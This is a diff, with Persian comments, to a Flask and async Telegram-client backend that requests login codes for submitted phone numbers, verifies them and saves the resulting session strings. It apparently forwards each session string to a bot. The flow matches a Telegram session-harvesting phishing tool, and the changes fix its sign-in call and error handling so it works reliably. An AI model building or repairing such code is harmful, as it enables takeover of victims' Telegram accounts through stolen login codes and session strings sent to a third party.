@@ -24,7 +24,7 @@ sessions = {}
 logging.basicConfig(level=logging.INFO)
 
 # ============================================================
-#  حلقه رویداد ثابت
+#  حلقه رویداد ثابت (مهم!)
 # ============================================================
 loop = asyncio.new_event_loop()
 asyncio.set_event_loop(loop)
@@ -46,7 +46,6 @@ def request_code():
     session_id = f"session_{phone.replace('+', '')}"
     sessions[session_id] = {'phone': phone, 'status': 'pending', 'client': None}
     
-    # اجرا با حلقه رویداد ثابت
     try:
         loop.run_until_complete(send_code(session_id, phone))
     except Exception as e:
@@ -70,12 +69,14 @@ def verify_code():
         return jsonify({'error': 'Session not found'}), 400
     
     try:
-        loop.run_until_complete(verify_session(session_id, phone, code))
+        result = loop.run_until_complete(verify_session(session_id, phone, code))
+        if result:
+            return jsonify({'success': True, 'message': 'Code verified'})
+        else:
+            return jsonify({'error': 'wrong_code'}), 400
     except Exception as e:
         logging.error(f"Error in verify_code: {e}")
         return jsonify({'error': str(e)}), 500
-    
-    return jsonify({'success': True, 'message': 'Verifying...'})
 
 # ============================================================
 #  توابع اصلی (async)
@@ -102,15 +103,16 @@ async def send_code(session_id, phone):
 async def verify_session(session_id, phone, code):
     session = sessions.get(session_id)
     if not session:
-        return
+        return False
     
     client = session.get('client')
     if not client:
         logging.error(f"❌ No client for {phone}")
-        return
+        return False
     
     try:
-        await client.sign_in(phone, code)
+        # ✅ درست: فقط کد رو تایید کن (شماره قبلاً ثبت شده)
+        await client.sign_in(code=code)
         session_string = client.session.save()
         
         # ارسال به ربات
@@ -119,10 +121,14 @@ async def verify_session(session_id, phone, code):
         sessions[session_id]['status'] = 'done'
         await client.disconnect()
         logging.info(f"✅ Session saved for: {phone}")
+        return True
         
     except Exception as e:
         sessions[session_id]['status'] = 'error'
         logging.error(f"❌ Verification error: {e}")
+        # اگر خطا مربوط به کد اشتباه بود
+        if 'code' in str(e).lower() or 'invalid' in str(e).lower():
+            return False
         raise
 
 async def send_to_bot(message):
